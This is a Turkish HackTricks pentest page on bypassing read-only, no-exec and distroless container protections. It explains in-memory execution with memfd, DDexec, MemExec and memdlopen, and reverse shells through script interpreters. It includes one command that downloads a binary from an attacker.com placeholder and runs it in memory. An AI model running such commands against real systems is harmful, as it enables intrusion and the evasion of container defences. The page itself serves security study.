# FS korumalarını aşma: yalnızca okunur / çalıştırılamaz / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Videolar

Aşağıdaki videolarda bu sayfada bahsedilen tekniklerin daha derinlemesine açıklamalarını bulabilirsiniz:

- [**DEF CON 31 - Linux Bellek Manipülasyonunu Gizlilik ve Kaçış için Keşfetmek**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**DDexec-ng ile Gizli Sızmalar & Bellek İçi dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## yalnızca okunur / çalıştırılamaz senaryosu

Linux makinelerinin **yalnızca okunur (ro) dosya sistemi koruması** ile monte edilmesi giderek daha yaygın hale geliyor, özellikle konteynerlerde. Bunun nedeni, bir konteyneri ro dosya sistemi ile çalıştırmanın **`readOnlyRootFilesystem: true`** ayarını `securitycontext` içinde ayarlamak kadar kolay olmasıdır:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ancak, dosya sistemi ro olarak monte edilse bile, **`/dev/shm`** hala yazılabilir olacak, bu nedenle diske hiçbir şey yazamayacağımız yalan. Ancak, bu klasör **çalıştırılamaz koruma ile monte edilecektir**, bu nedenle burada bir ikili dosya indirirseniz **onu çalıştıramayacaksınız**.

> [!WARNING]
> Kırmızı takım perspektifinden, bu, sistemde zaten bulunmayan ikili dosyaları **indirmek ve çalıştırmak için karmaşık hale getirir** (örneğin, arka kapılar veya `kubectl` gibi numaralandırıcılar).

## En Kolay Aşma: Scriptler

İkili dosyalardan bahsettiğimi unutmayın, eğer yorumlayıcı makine içinde mevcutsa, **herhangi bir scripti** çalıştırabilirsiniz, örneğin **shell script** eğer `sh` mevcutsa veya **python** **script** eğer `python` yüklüyse.

Ancak, bu yalnızca ikili dosya arka kapınızı veya çalıştırmanız gereken diğer ikili araçları çalıştırmak için yeterli değildir.

## Bellek Aşmaları

Bir ikili dosyayı çalıştırmak istiyorsanız ancak dosya sistemi buna izin vermiyorsa, bunu **bellekten çalıştırarak** yapmanın en iyi yolu, çünkü **korumalar burada geçerli değildir**.

### FD + exec syscall aşması

Makine içinde bazı güçlü script motorlarına sahipseniz, örneğin **Python**, **Perl** veya **Ruby**, ikili dosyayı belleğe indirmek, bir bellek dosya tanımlayıcısında (`create_memfd` syscall) saklamak, bu korumalardan etkilenmeyecek ve ardından **`exec` syscall** çağrısı yaparak **fd'yi çalıştırılacak dosya olarak belirtmek** mümkündür.

Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Bir ikili dosya geçirebilir ve belirtilen dilde **ikili dosya sıkıştırılmış ve b64 kodlanmış** bir script oluşturur, ardından **decode ve decompress** talimatları ile birlikte `create_memfd` syscall çağrısı yaparak oluşturulan bir **fd** içinde saklar ve çalıştırmak için **exec** syscall çağrısı yapar.

> [!WARNING]
> Bu, PHP veya Node gibi diğer script dillerinde çalışmaz çünkü scriptten **ham syscall'leri çağırmanın varsayılan bir yolu yoktur**, bu nedenle ikili dosyayı saklamak için **bellek fd** oluşturmak için `create_memfd` çağrısı yapmak mümkün değildir.
>
> Dahası, `/dev/shm` içinde bir dosya ile **normal bir fd** oluşturmak işe yaramaz, çünkü **çalıştırılamaz koruma** uygulanacağı için bunu çalıştırmanıza izin verilmeyecektir.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) tekniği, **kendi sürecinizin belleğini** değiştirmenizi sağlar, bu da **`/proc/self/mem`** üzerine yazmayı içerir.

Bu nedenle, sürecin yürüttüğü **assembly kodunu kontrol ederek**, bir **shellcode** yazabilir ve süreci **herhangi bir keyfi kodu çalıştıracak şekilde "mutasyona" uğratabilirsiniz**.

> [!TIP]
> **DDexec / EverythingExec**, kendi **shellcode** veya **herhangi bir ikili dosyayı** **bellekten** yükleyip **çalıştırmanıza** olanak tanır.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Daha fazla bilgi için bu tekniği kontrol edin Github veya:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), DDexec'in doğal bir sonraki adımıdır. **Farklı bir ikili dosya çalıştırmak** istediğinizde DDexec'i yeniden başlatmanıza gerek kalmadan, memexec shellcode'u DDexec tekniği aracılığıyla çalıştırabilir ve ardından **yeni ikili dosyaları yüklemek ve çalıştırmak için bu demon ile iletişim kurabilirsiniz**.

**Memexec'i bir PHP ters shell'den ikili dosyaları çalıştırmak için nasıl kullanacağınızla ilgili bir örneği** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.

### Memdlopen

DDexec ile benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, ikili dosyaları **hafızaya yüklemenin daha kolay bir yolunu** sağlar ve daha sonra bunları çalıştırmanıza olanak tanır. Hatta bağımlılıkları olan ikili dosyaları yüklemenize bile izin verebilir.

## Distroless Bypass

### Distroless nedir

Distroless konteynerler, belirli bir uygulama veya hizmeti çalıştırmak için gerekli olan **en temel bileşenleri** içerir, örneğin kütüphaneler ve çalışma zamanı bağımlılıkları, ancak bir paket yöneticisi, shell veya sistem yardımcı programları gibi daha büyük bileşenleri hariç tutar.

Distroless konteynerlerin amacı, **gereksiz bileşenleri ortadan kaldırarak konteynerlerin saldırı yüzeyini azaltmak** ve istismar edilebilecek zafiyet sayısını en aza indirmektir.

### Ters Shell

Distroless bir konteynerde **normal bir shell almak için `sh` veya `bash`** bile bulamayabilirsiniz. Ayrıca `ls`, `whoami`, `id` gibi ikili dosyaları da bulamayacaksınız... genellikle bir sistemde çalıştırdığınız her şey.

> [!WARNING]
> Bu nedenle, **ters shell** almanız veya sistemi **listelemeniz** mümkün **olmayacak**.

Ancak, eğer ele geçirilmiş konteyner örneğin bir flask web çalıştırıyorsa, o zaman python yüklüdür ve dolayısıyla bir **Python ters shell** alabilirsiniz. Eğer node çalıştırıyorsa, bir Node rev shell alabilirsiniz ve çoğu **betik dili** ile aynı durum geçerlidir.

> [!TIP]
> Betik dilini kullanarak, dilin yeteneklerini kullanarak **sistemi listeleyebilirsiniz**.

Eğer **`read-only/no-exec`** korumaları yoksa, ters shell'inizi **dosya sistemine ikili dosyalarınızı yazmak** ve **çalıştırmak** için kötüye kullanabilirsiniz.

> [!TIP]
> Ancak, bu tür konteynerlerde bu korumalar genellikle mevcut olacaktır, ancak **önceki bellek yürütme tekniklerini bunları aşmak için kullanabilirsiniz**.

**Bazı RCE zafiyetlerini istismar ederek betik dillerinden **ters shell'ler** almak ve hafızadan ikili dosyaları çalıştırmak için **örnekler** bulabilirsiniz** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
